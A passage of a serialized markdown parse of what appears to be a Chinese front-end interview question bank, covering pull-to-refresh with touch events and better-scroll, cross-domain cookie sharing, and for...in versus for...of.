<ul id=\\"refreshContainer\\">\\n        <li>111</li>\\n        <li>222</li>\\n        <li>333</li>\\n        <li>444</li>\\n        <li>555</li>\\n        ...\\n    </ul>\\n</main>\\n```","lang":"js","text":"<main>\\n    <p class=\\"refreshText\\"></p >\\n    <ul id=\\"refreshContainer\\">\\n        <li>111</li>\\n        <li>222</li>\\n        <li>333</li>\\n        <li>444</li>\\n        <li>555</li>\\n        ...\\n    </ul>\\n</main>"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"监听`touchstart`事件，记录初始的值","text":"监听`touchstart`事件，记录初始的值","tokens":[{"type":"text","raw":"监听","text":"监听","escaped":false},{"type":"codespan","raw":"`touchstart`","text":"touchstart"},{"type":"text","raw":"事件，记录初始的值","text":"事件，记录初始的值","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nvar _element = document.getElementById(\'refreshContainer\'),\\n    _refreshText = document.querySelector(\'.refreshText\'),\\n    _startPos = 0,  // 初始的值\\n    _transitionHeight = 0; // 移动的距离\\n\\n_element.addEventListener(\'touchstart\', function(e) {\\n    _startPos = e.touches[0].pageY; // 记录初始位置\\n    _element.style.position = \'relative\';\\n    _element.style.transition = \'transform 0s\';\\n}, false);\\n```","lang":"js","text":"var _element = document.getElementById(\'refreshContainer\'),\\n    _refreshText = document.querySelector(\'.refreshText\'),\\n    _startPos = 0,  // 初始的值\\n    _transitionHeight = 0; // 移动的距离\\n\\n_element.addEventListener(\'touchstart\', function(e) {\\n    _startPos = e.touches[0].pageY; // 记录初始位置\\n    _element.style.position = \'relative\';\\n    _element.style.transition = \'transform 0s\';\\n}, false);"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"监听`touchmove`移动事件，记录滑动差值","text":"监听`touchmove`移动事件，记录滑动差值","tokens":[{"type":"text","raw":"监听","text":"监听","escaped":false},{"type":"codespan","raw":"`touchmove`","text":"touchmove"},{"type":"text","raw":"移动事件，记录滑动差值","text":"移动事件，记录滑动差值","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n_element.addEventListener(\'touchmove\', function(e) {\\n    // e.touches[0].pageY 当前位置\\n    _transitionHeight = e.touches[0].pageY - _startPos; // 记录差值\\n\\n    if (_transitionHeight > 0 && _transitionHeight < 60) { \\n        _refreshText.innerText = \'下拉刷新\'; \\n        _element.style.transform = \'translateY(\'+_transitionHeight+\'px)\';\\n\\n        if (_transitionHeight > 55) {\\n            _refreshText.innerText = \'释放更新\';\\n        }\\n    }                \\n}, false);\\n```","lang":"js","text":"_element.addEventListener(\'touchmove\', function(e) {\\n    // e.touches[0].pageY 当前位置\\n    _transitionHeight = e.touches[0].pageY - _startPos; // 记录差值\\n\\n    if (_transitionHeight > 0 && _transitionHeight < 60) { \\n        _refreshText.innerText = \'下拉刷新\'; \\n        _element.style.transform = \'translateY(\'+_transitionHeight+\'px)\';\\n\\n        if (_transitionHeight > 55) {\\n            _refreshText.innerText = \'释放更新\';\\n        }\\n    }                \\n}, false);"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"最后，就是监听`touchend`离开的事件","text":"最后，就是监听`touchend`离开的事件","tokens":[{"type":"text","raw":"最后，就是监听","text":"最后，就是监听","escaped":false},{"type":"codespan","raw":"`touchend`","text":"touchend"},{"type":"text","raw":"离开的事件","text":"离开的事件","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n_element.addEventListener(\'touchend\', function(e) {\\n    _element.style.transition = \'transform 0.5s ease 1s\';\\n    _element.style.transform = \'translateY(0px)\';\\n    _refreshText.innerText = \'更新中...\';\\n    // todo...\\n\\n}, false);\\n```","lang":"js","text":"_element.addEventListener(\'touchend\', function(e) {\\n    _element.style.transition = \'transform 0.5s ease 1s\';\\n    _element.style.transform = \'translateY(0px)\';\\n    _refreshText.innerText = \'更新中...\';\\n    // todo...\\n\\n}, false);"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"从上面可以看到，在下拉到松手的过程中，经历了三个阶段：","text":"从上面可以看到，在下拉到松手的过程中，经历了三个阶段：","tokens":[{"type":"text","raw":"从上面可以看到，在下拉到松手的过程中，经历了三个阶段：","text":"从上面可以看到，在下拉到松手的过程中，经历了三个阶段：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作\\n- 下拉到一定值时，显示松手释放后的操作提示\\n- 下拉到达设定最大值松手时，执行回调，提示正在进行更新操作\\n\\n- **2：** 案例","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作\\n","task":false,"loose":true,"text":"当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作","tokens":[{"type":"text","raw":"当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作","text":"当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作","tokens":[{"type":"text","raw":"当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作","text":"当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作","escaped":false}]}]},{"type":"list_item","raw":"- 下拉到一定值时，显示松手释放后的操作提示\\n","task":false,"loose":true,"text":"下拉到一定值时，显示松手释放后的操作提示","tokens":[{"type":"text","raw":"下拉到一定值时，显示松手释放后的操作提示","text":"下拉到一定值时，显示松手释放后的操作提示","tokens":[{"type":"text","raw":"下拉到一定值时，显示松手释放后的操作提示","text":"下拉到一定值时，显示松手释放后的操作提示","escaped":false}]}]},{"type":"list_item","raw":"- 下拉到达设定最大值松手时，执行回调，提示正在进行更新操作\\n\\n","task":false,"loose":true,"text":"下拉到达设定最大值松手时，执行回调，提示正在进行更新操作\\n","tokens":[{"type":"text","raw":"下拉到达设定最大值松手时，执行回调，提示正在进行更新操作\\n","text":"下拉到达设定最大值松手时，执行回调，提示正在进行更新操作","tokens":[{"type":"text","raw":"下拉到达设定最大值松手时，执行回调，提示正在进行更新操作","text":"下拉到达设定最大值松手时，执行回调，提示正在进行更新操作","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 案例","task":false,"loose":true,"text":"**2：** 案例","tokens":[{"type":"text","raw":"**2：** 案例","text":"**2：** 案例","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 案例","text":" 案例","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在实际开发中，我们更多的是使用第三方库，下面以`better-scroll`进行举例：","text":"在实际开发中，我们更多的是使用第三方库，下面以`better-scroll`进行举例：","tokens":[{"type":"text","raw":"在实际开发中，我们更多的是使用第三方库，下面以","text":"在实际开发中，我们更多的是使用第三方库，下面以","escaped":false},{"type":"codespan","raw":"`better-scroll`","text":"better-scroll"},{"type":"text","raw":"进行举例：","text":"进行举例：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"HTML结构","text":"HTML结构","tokens":[{"type":"text","raw":"HTML结构","text":"HTML结构","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n<div id=\\"position-wrapper\\">\\n    <div>\\n        <p class=\\"refresh\\">下拉刷新</p >\\n        <div class=\\"position-list\\">\\n   <!--列表内容-->\\n        </div>\\n        <p class=\\"more\\">查看更多</p >\\n    </div>\\n</div>\\n```","lang":"js","text":"<div id=\\"position-wrapper\\">\\n    <div>\\n        <p class=\\"refresh\\">下拉刷新</p >\\n        <div class=\\"position-list\\">\\n   <!--列表内容-->\\n        </div>\\n        <p class=\\"more\\">查看更多</p >\\n    </div>\\n</div>"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"实例化上拉下拉插件，通过`use`来注册插件","text":"实例化上拉下拉插件，通过`use`来注册插件","tokens":[{"type":"text","raw":"实例化上拉下拉插件，通过","text":"实例化上拉下拉插件，通过","escaped":false},{"type":"codespan","raw":"`use`","text":"use"},{"type":"text","raw":"来注册插件","text":"来注册插件","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nimport BScroll from \\"@better-scroll/core\\";\\nimport PullDown from \\"@better-scroll/pull-down\\";\\nimport PullUp from \'@better-scroll/pull-up\';\\nBScroll.use(PullDown);\\nBScroll.use(PullUp);\\n```","lang":"js","text":"import BScroll from \\"@better-scroll/core\\";\\nimport PullDown from \\"@better-scroll/pull-down\\";\\nimport PullUp from \'@better-scroll/pull-up\';\\nBScroll.use(PullDown);\\nBScroll.use(PullUp);"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"实例化`BetterScroll`，并传入相关的参数","text":"实例化`BetterScroll`，并传入相关的参数","tokens":[{"type":"text","raw":"实例化","text":"实例化","escaped":false},{"type":"codespan","raw":"`BetterScroll`","text":"BetterScroll"},{"type":"text","raw":"，并传入相关的参数","text":"，并传入相关的参数","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nlet pageNo = 1,pageSize = 10,dataList = [],isMore = true;  \\nvar scroll= new BScroll(\\"#position-wrapper\\",{\\n    scrollY:true,//垂直方向滚动\\n    click:true,//默认会阻止浏览器的原生click事件，如果需要点击，这里要设为true\\n    pullUpLoad:true,//上拉加载更多\\n    pullDownRefresh:{\\n        threshold:50,//触发pullingDown事件的位置\\n        stop:0//下拉回弹后停留的位置\\n    }\\n});\\n//监听下拉刷新\\nscroll.on(\\"pullingDown\\",pullingDownHandler);\\n//监测实时滚动\\nscroll.on(\\"scroll\\",scrollHandler);\\n//上拉加载更多\\nscroll.on(\\"pullingUp\\",pullingUpHandler);\\n\\nasync function pullingDownHandler(){\\n    dataList=[];\\n    pageNo=1;\\n    isMore=true;\\n    $(\\".more\\").text(\\"查看更多\\");\\n    await getlist();//请求数据\\n    scroll.finishPullDown();//每次下拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作\\n}\\nasync function pullingUpHandler(){\\n    if(!isMore){\\n        $(\\".more\\").text(\\"没有更多数据了\\");\\n        scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n        return;\\n    }\\n    pageNo++;\\n    await this.getlist();//请求数据\\n    scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作    \\n}\\nfunction scrollHandler(){\\n    if(this.y>50) $(\'.refresh\').text(\\"松手开始加载\\");\\n    else $(\'.refresh\').text(\\"下拉刷新\\");\\n}\\nfunction getlist(){\\n    //返回的数据\\n    let result=....;\\n    dataList=dataList.concat(result);\\n    //判断是否已加载完\\n    if(result.length<pageSize) isMore=false;\\n    //将dataList渲染到html内容中\\n}    \\n```","lang":"js","text":"let pageNo = 1,pageSize = 10,dataList = [],isMore = true;  \\nvar scroll= new BScroll(\\"#position-wrapper\\",{\\n    scrollY:true,//垂直方向滚动\\n    click:true,//默认会阻止浏览器的原生click事件，如果需要点击，这里要设为true\\n    pullUpLoad:true,//上拉加载更多\\n    pullDownRefresh:{\\n        threshold:50,//触发pullingDown事件的位置\\n        stop:0//下拉回弹后停留的位置\\n    }\\n});\\n//监听下拉刷新\\nscroll.on(\\"pullingDown\\",pullingDownHandler);\\n//监测实时滚动\\nscroll.on(\\"scroll\\",scrollHandler);\\n//上拉加载更多\\nscroll.on(\\"pullingUp\\",pullingUpHandler);\\n\\nasync function pullingDownHandler(){\\n    dataList=[];\\n    pageNo=1;\\n    isMore=true;\\n    $(\\".more\\").text(\\"查看更多\\");\\n    await getlist();//请求数据\\n    scroll.finishPullDown();//每次下拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作\\n}\\nasync function pullingUpHandler(){\\n    if(!isMore){\\n        $(\\".more\\").text(\\"没有更多数据了\\");\\n        scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n        return;\\n    }\\n    pageNo++;\\n    await this.getlist();//请求数据\\n    scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作    \\n}\\nfunction scrollHandler(){\\n    if(this.y>50) $(\'.refresh\').text(\\"松手开始加载\\");\\n    else $(\'.refresh\').text(\\"下拉刷新\\");\\n}\\nfunction getlist(){\\n    //返回的数据\\n    let result=....;\\n    dataList=dataList.concat(result);\\n    //判断是否已加载完\\n    if(result.length<pageSize) isMore=false;\\n    //将dataList渲染到html内容中\\n}    "},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注意点：","text":"注意点：","tokens":[{"type":"text","raw":"注意点：","text":"注意点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用 `better-scroll` 实现下拉刷新、上拉加载时要注意以下几点：","text":"使用 `better-scroll` 实现下拉刷新、上拉加载时要注意以下几点：","tokens":[{"type":"text","raw":"使用 ","text":"使用 ","escaped":false},{"type":"codespan","raw":"`better-scroll`","text":"better-scroll"},{"type":"text","raw":" 实现下拉刷新、上拉加载时要注意以下几点：","text":" 实现下拉刷新、上拉加载时要注意以下几点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- `wrapper` 里必须只有一个子元素\\n- 子元素的高度要比 `wrapper` 要高\\n- 使用的时候，要确定 `DOM` 元素是否已经生成，必须要等到 `DOM` 渲染完成后，再 `new BScroll()`\\n- 滚动区域的 `DOM` 元素结构有变化后，需要执行刷新 `refresh()`\\n- 上拉或者下拉，结束后，需要执行 `finishPullUp()` 或者 `finishPullDown()`，否则将不会执行下次操作\\n- `better-scroll`，默认会阻止浏览器的原生 `click` 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 `click:true`","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- `wrapper` 里必须只有一个子元素\\n","task":false,"loose":false,"text":"`wrapper` 里必须只有一个子元素","tokens":[{"type":"text","raw":"`wrapper` 里必须只有一个子元素","text":"`wrapper` 里必须只有一个子元素","tokens":[{"type":"codespan","raw":"`wrapper`","text":"wrapper"},{"type":"text","raw":" 里必须只有一个子元素","text":" 里必须只有一个子元素","escaped":false}]}]},{"type":"list_item","raw":"- 子元素的高度要比 `wrapper` 要高\\n","task":false,"loose":false,"text":"子元素的高度要比 `wrapper` 要高","tokens":[{"type":"text","raw":"子元素的高度要比 `wrapper` 要高","text":"子元素的高度要比 `wrapper` 要高","tokens":[{"type":"text","raw":"子元素的高度要比 ","text":"子元素的高度要比 ","escaped":false},{"type":"codespan","raw":"`wrapper`","text":"wrapper"},{"type":"text","raw":" 要高","text":" 要高","escaped":false}]}]},{"type":"list_item","raw":"- 使用的时候，要确定 `DOM` 元素是否已经生成，必须要等到 `DOM` 渲染完成后，再 `new BScroll()`\\n","task":false,"loose":false,"text":"使用的时候，要确定 `DOM` 元素是否已经生成，必须要等到 `DOM` 渲染完成后，再 `new BScroll()`","tokens":[{"type":"text","raw":"使用的时候，要确定 `DOM` 元素是否已经生成，必须要等到 `DOM` 渲染完成后，再 `new BScroll()`","text":"使用的时候，要确定 `DOM` 元素是否已经生成，必须要等到 `DOM` 渲染完成后，再 `new BScroll()`","tokens":[{"type":"text","raw":"使用的时候，要确定 ","text":"使用的时候，要确定 ","escaped":false},{"type":"codespan","raw":"`DOM`","text":"DOM"},{"type":"text","raw":" 元素是否已经生成，必须要等到 ","text":" 元素是否已经生成，必须要等到 ","escaped":false},{"type":"codespan","raw":"`DOM`","text":"DOM"},{"type":"text","raw":" 渲染完成后，再 ","text":" 渲染完成后，再 ","escaped":false},{"type":"codespan","raw":"`new BScroll()`","text":"new BScroll()"}]}]},{"type":"list_item","raw":"- 滚动区域的 `DOM` 元素结构有变化后，需要执行刷新 `refresh()`\\n","task":false,"loose":false,"text":"滚动区域的 `DOM` 元素结构有变化后，需要执行刷新 `refresh()`","tokens":[{"type":"text","raw":"滚动区域的 `DOM` 元素结构有变化后，需要执行刷新 `refresh()`","text":"滚动区域的 `DOM` 元素结构有变化后，需要执行刷新 `refresh()`","tokens":[{"type":"text","raw":"滚动区域的 ","text":"滚动区域的 ","escaped":false},{"type":"codespan","raw":"`DOM`","text":"DOM"},{"type":"text","raw":" 元素结构有变化后，需要执行刷新 ","text":" 元素结构有变化后，需要执行刷新 ","escaped":false},{"type":"codespan","raw":"`refresh()`","text":"refresh()"}]}]},{"type":"list_item","raw":"- 上拉或者下拉，结束后，需要执行 `finishPullUp()` 或者 `finishPullDown()`，否则将不会执行下次操作\\n","task":false,"loose":false,"text":"上拉或者下拉，结束后，需要执行 `finishPullUp()` 或者 `finishPullDown()`，否则将不会执行下次操作","tokens":[{"type":"text","raw":"上拉或者下拉，结束后，需要执行 `finishPullUp()` 或者 `finishPullDown()`，否则将不会执行下次操作","text":"上拉或者下拉，结束后，需要执行 `finishPullUp()` 或者 `finishPullDown()`，否则将不会执行下次操作","tokens":[{"type":"text","raw":"上拉或者下拉，结束后，需要执行 ","text":"上拉或者下拉，结束后，需要执行 ","escaped":false},{"type":"codespan","raw":"`finishPullUp()`","text":"finishPullUp()"},{"type":"text","raw":" 或者 ","text":" 或者 ","escaped":false},{"type":"codespan","raw":"`finishPullDown()`","text":"finishPullDown()"},{"type":"text","raw":"，否则将不会执行下次操作","text":"，否则将不会执行下次操作","escaped":false}]}]},{"type":"list_item","raw":"- `better-scroll`，默认会阻止浏览器的原生 `click` 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 `click:true`","task":false,"loose":false,"text":"`better-scroll`，默认会阻止浏览器的原生 `click` 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 `click:true`","tokens":[{"type":"text","raw":"`better-scroll`，默认会阻止浏览器的原生 `click` 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 `click:true`","text":"`better-scroll`，默认会阻止浏览器的原生 `click` 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 `click:true`","tokens":[{"type":"codespan","raw":"`better-scroll`","text":"better-scroll"},{"type":"text","raw":"，默认会阻止浏览器的原生 ","text":"，默认会阻止浏览器的原生 ","escaped":false},{"type":"codespan","raw":"`click`","text":"click"},{"type":"text","raw":" 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 ","text":" 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 ","escaped":false},{"type":"codespan","raw":"`click:true`","text":"click:true"}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 26. cookie 可以实现不同域共享吗？\\n\\n","depth":2,"text":"26. cookie 可以实现不同域共享吗？","tokens":[{"type":"text","raw":"26. cookie 可以实现不同域共享吗？","text":"26. cookie 可以实现不同域共享吗？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 默认情况下，Cookie 不能在不同的顶级域名之间共享数据。\\n\\n- 但是，如果两个域名属于同一主域名下的子域名，并且您设置了正确的 Domain 属性，那么在这些子域名之间是可以共享 Cookie 的。\\n\\n- 例如，对于 sub1.example.com 和 sub2.example.com 这样的子域名，如果设置 Cookie 的 Domain 属性为 .example.com ，那么在这两个子域名之间，这个 Cookie 是可以共享和访问的。\\n\\n- 然而，如果是完全不同的顶级域名，如 example.com 和 anotherdomain.com 之间，Cookie 是不能直接共享的。\\n\\n- 此外，还需要注意 Cookie 的 Path 属性、安全属性（Secure）、HttpOnly 属性等，这些属性也会影响 Cookie 的使用范围和方式。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 默认情况下，Cookie 不能在不同的顶级域名之间共享数据。\\n\\n","task":false,"loose":true,"text":"默认情况下，Cookie 不能在不同的顶级域名之间共享数据。\\n","tokens":[{"type":"text","raw":"默认情况下，Cookie 不能在不同的顶级域名之间共享数据。\\n","text":"默认情况下，Cookie 不能在不同的顶级域名之间共享数据。","tokens":[{"type":"text","raw":"默认情况下，Cookie 不能在不同的顶级域名之间共享数据。","text":"默认情况下，Cookie 不能在不同的顶级域名之间共享数据。","escaped":false}]}]},{"type":"list_item","raw":"- 但是，如果两个域名属于同一主域名下的子域名，并且您设置了正确的 Domain 属性，那么在这些子域名之间是可以共享 Cookie 的。\\n\\n","task":false,"loose":true,"text":"但是，如果两个域名属于同一主域名下的子域名，并且您设置了正确的 Domain 属性，那么在这些子域名之间是可以共享 Cookie 的。\\n","tokens":[{"type":"text","raw":"但是，如果两个域名属于同一主域名下的子域名，并且您设置了正确的 Domain 属性，那么在这些子域名之间是可以共享 Cookie 的。\\n","text":"但是，如果两个域名属于同一主域名下的子域名，并且您设置了正确的 Domain 属性，那么在这些子域名之间是可以共享 Cookie 的。","tokens":[{"type":"text","raw":"但是，如果两个域名属于同一主域名下的子域名，并且您设置了正确的 Domain 属性，那么在这些子域名之间是可以共享 Cookie 的。","text":"但是，如果两个域名属于同一主域名下的子域名，并且您设置了正确的 Domain 属性，那么在这些子域名之间是可以共享 Cookie 的。","escaped":false}]}]},{"type":"list_item","raw":"- 例如，对于 sub1.example.com 和 sub2.example.com 这样的子域名，如果设置 Cookie 的 Domain 属性为 .example.com ，那么在这两个子域名之间，这个 Cookie 是可以共享和访问的。\\n\\n","task":false,"loose":true,"text":"例如，对于 sub1.example.com 和 sub2.example.com 这样的子域名，如果设置 Cookie 的 Domain 属性为 .example.com ，那么在这两个子域名之间，这个 Cookie 是可以共享和访问的。\\n","tokens":[{"type":"text","raw":"例如，对于 sub1.example.com 和 sub2.example.com 这样的子域名，如果设置 Cookie 的 Domain 属性为 .example.com ，那么在这两个子域名之间，这个 Cookie 是可以共享和访问的。\\n","text":"例如，对于 sub1.example.com 和 sub2.example.com 这样的子域名，如果设置 Cookie 的 Domain 属性为 .example.com ，那么在这两个子域名之间，这个 Cookie 是可以共享和访问的。","tokens":[{"type":"text","raw":"例如，对于 sub1.example.com 和 sub2.example.com 这样的子域名，如果设置 Cookie 的 Domain 属性为 .example.com ，那么在这两个子域名之间，这个 Cookie 是可以共享和访问的。","text":"例如，对于 sub1.example.com 和 sub2.example.com 这样的子域名，如果设置 Cookie 的 Domain 属性为 .example.com ，那么在这两个子域名之间，这个 Cookie 是可以共享和访问的。","escaped":false}]}]},{"type":"list_item","raw":"- 然而，如果是完全不同的顶级域名，如 example.com 和 anotherdomain.com 之间，Cookie 是不能直接共享的。\\n\\n","task":false,"loose":true,"text":"然而，如果是完全不同的顶级域名，如 example.com 和 anotherdomain.com 之间，Cookie 是不能直接共享的。\\n","tokens":[{"type":"text","raw":"然而，如果是完全不同的顶级域名，如 example.com 和 anotherdomain.com 之间，Cookie 是不能直接共享的。\\n","text":"然而，如果是完全不同的顶级域名，如 example.com 和 anotherdomain.com 之间，Cookie 是不能直接共享的。","tokens":[{"type":"text","raw":"然而，如果是完全不同的顶级域名，如 example.com 和 anotherdomain.com 之间，Cookie 是不能直接共享的。","text":"然而，如果是完全不同的顶级域名，如 example.com 和 anotherdomain.com 之间，Cookie 是不能直接共享的。","escaped":false}]}]},{"type":"list_item","raw":"- 此外，还需要注意 Cookie 的 Path 属性、安全属性（Secure）、HttpOnly 属性等，这些属性也会影响 Cookie 的使用范围和方式。","task":false,"loose":true,"text":"此外，还需要注意 Cookie 的 Path 属性、安全属性（Secure）、HttpOnly 属性等，这些属性也会影响 Cookie 的使用范围和方式。","tokens":[{"type":"text","raw":"此外，还需要注意 Cookie 的 Path 属性、安全属性（Secure）、HttpOnly 属性等，这些属性也会影响 Cookie 的使用范围和方式。","text":"此外，还需要注意 Cookie 的 Path 属性、安全属性（Secure）、HttpOnly 属性等，这些属性也会影响 Cookie 的使用范围和方式。","tokens":[{"type":"text","raw":"此外，还需要注意 Cookie 的 Path 属性、安全属性（Secure）、HttpOnly 属性等，这些属性也会影响 Cookie 的使用范围和方式。","text":"此外，还需要注意 Cookie 的 Path 属性、安全属性（Secure）、HttpOnly 属性等，这些属性也会影响 Cookie 的使用范围和方式。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 27. for in和for of的区别？\\n\\n","depth":2,"text":"27. for in和for of的区别？","tokens":[{"type":"text","raw":"27. for in和for of的区别？","text":"27. for in和for of的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- for…of 是ES6新增的遍历方式，允许遍历一个含有iterator接口的数据结构（数组、对象等）并且返回各项的值，和ES3中的for…in的区别如下\\n\\n- for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名\\n\\n- for… in 会遍历对象的整个原型链，性能非常差不推荐使用，而 for … of 只遍历当前对象不会遍历原型链；\\n\\n- 对于数组的遍历，for…in 会返回数组中所有可枚举的属性(包括原型链上可枚举的属性)，for…of 只返回数组的下标对应的属性值；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- for…of 是ES6新增的遍历方式，允许遍历一个含有iterator接口的数据结构（数组、对象等）并且返回各项的值，和ES3中的for…in的区别如下\\n\\n","task":false,"loose":true,"text":"for…of 是ES6新增的遍历方式，允许遍历一个含有iterator接口的数据结构（数组、对象等）并且返回各项的值，和ES3中的for…in的区别如下\\n","tokens":[{"type":"text","raw":"for…of 是ES6新增的遍历方式，允许遍历一个含有iterator接口的数据结构（数组、对象等）并且返回各项的值，和ES3中的for…in的区别如下\\n","text":"for…of 是ES6新增的遍历方式，允许遍历一个含有iterator接口的数据结构（数组、对象等）并且返回各项的值，和ES3中的for…in的区别如下","tokens":[{"type":"text","raw":"for…of 是ES6新增的遍历方式，允许遍历一个含有iterator接口的数据结构（数组、对象等）并且返回各项的值，和ES3中的for…in的区别如下","text":"for…of 是ES6新增的遍历方式，允许遍历一个含有iterator接口的数据结构（数组、对象等）并且返回各项的值，和ES3中的for…in的区别如下","escaped":false}]}]},{"type":"list_item","raw":"- for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名\\n\\n","task":false,"loose":true,"text":"for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名\\n","tokens":[{"type":"text","raw":"for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名\\n","text":"for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名","tokens":[{"type":"text","raw":"for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名","text":"for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名","escaped":false}]}]},{"type":"list_item","raw":"- for… in 会遍历对象的整个原型链，性能非常差不推荐使用，而 for … of 只遍历当前对象不会遍历原型链；\\n\\n","task":false,"loose":true,"text":"for… in 会遍历对象的整个原型链，性能非常差不推荐使用，而 for … of 只遍历当前对象不会遍历原型链；\\n","tokens":[{"type":"text","raw":"for… in 会遍历对象的整个原型链，性能非常差不推荐使用，而 for … of 只遍历当前对象不会遍历原型链；\\n","text":"for… in 会遍历对象的整个原型链，性能非常差不推荐使用，而 for … of 只遍历当前对象不会遍历原型链；","tokens":[{"type":"text","raw":"for… in 会遍历对象的整个原型链，性能非常差不推荐使用，而 for … of 只遍历当前对象不会遍历原型链；","text":"for… in 会遍历对象的整个原型链，性能非常差不推荐使用，而 for … of 只遍历当前对象不会遍历原型链；","escaped":false}]}]},{"type":"list_item","raw":"- 对于数组的遍历，for…in 会返回数组中所有可枚举的属性(包括原型链上可枚举的属性)，for…of 只返回数组的下标对应的属性值；","task":false,"loose":true,"text":"对于数组的遍历，for…in 会返回数组中所有可枚举的属性(包括原型链上可枚举的属性)，for…of 